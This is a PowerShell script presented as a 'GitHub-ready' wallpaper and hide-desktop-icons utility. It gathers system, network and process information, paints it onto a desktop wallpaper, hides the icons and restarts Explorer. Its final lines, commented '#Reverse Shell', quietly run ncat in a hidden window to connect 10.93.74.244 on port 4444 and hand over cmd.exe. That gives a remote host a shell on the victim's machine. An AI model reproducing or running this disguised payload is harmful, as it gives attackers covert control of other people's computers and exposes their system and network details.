# --- WALLPAPER + HIDE DESKTOP ICONS (GitHub-ready) ---

$OutFile  = "$env:USERPROFILE\wallpaper_debug.jpg"
$TempFile = "$env:TEMP\foo.txt"

# Collect system info
try {
    $sysinfo  = systeminfo | Out-String
    $netinfo  = ipconfig /all | Out-String
    $procinfo = Get-Process | Select-Object -First 20 | Out-String

    $data = @"
===== SYSTEM INFO =====
$sysinfo

===== NETWORK INFO =====
$netinfo

===== PROCESSES (first 20) =====
$procinfo
"@

    $data | Out-File -FilePath $TempFile -Encoding UTF8
}
catch {
    "DEBUG MODE: Data collection failed." | Out-File -FilePath $TempFile -Encoding UTF8
}

$content = if (Test-Path $TempFile) { Get-Content $TempFile -Raw } else { "DEBUG MODE: foo.txt missing" }

# Create wallpaper
Add-Type -AssemblyName System.Drawing
[int]$width = 1920
[int]$height = 1080
$bitmap = New-Object System.Drawing.Bitmap $width,$height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)

$brushBg = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(30,144,255))
$graphics.FillRectangle($brushBg,0,0,$width,$height)

$font = New-Object System.Drawing.Font("Consolas",16,[System.Drawing.FontStyle]::Bold)
$brushFg = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
$rect = New-Object System.Drawing.RectangleF(50,50,($width-100),($height-100))
$stringFormat = New-Object System.Drawing.StringFormat
$stringFormat.Alignment = [System.Drawing.StringAlignment]::Near
$stringFormat.LineAlignment = [System.Drawing.StringAlignment]::Near

$graphics.DrawString($content,$font,$brushFg,$rect,$stringFormat)

if (Test-Path $OutFile) { Remove-Item $OutFile -Force }
$bitmap.Save($OutFile,[System.Drawing.Imaging.ImageFormat]::Jpeg)
$graphics.Dispose()
$bitmap.Dispose()

# Set wallpaper
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll",SetLastError=true)]
    public static extern bool SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);
}
"@

[Wallpaper]::SystemParametersInfo(0x0014,0,$OutFile,0x01 -bor 0x02)

# Hide desktop icons and restart Explorer
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideIcons" -Value 1
Stop-Process -Name explorer -Force
Start-Process explorer.exe
Start-Sleep -Milliseconds 500

# Close any Explorer windows that opened automatically
Get-Process explorer | ForEach-Object {
    # Minimize / close windows except the shell itself
    $hwnds = @(New-Object -ComObject Shell.Application).Windows() | Where-Object { $_.Name -like "*File Explorer*" }
    foreach ($w in $hwnds) {
        $w.Quit()
    }
}

#Reverse Shell
Set-Location $env:USERPROFILE
$Ncat = "C:\Program Files (x86)\Nmap\ncat.exe"
Start-Process -FilePath $Ncat -ArgumentList "10.93.74.244 4444 -e cmd.exe" -WindowStyle Hidden



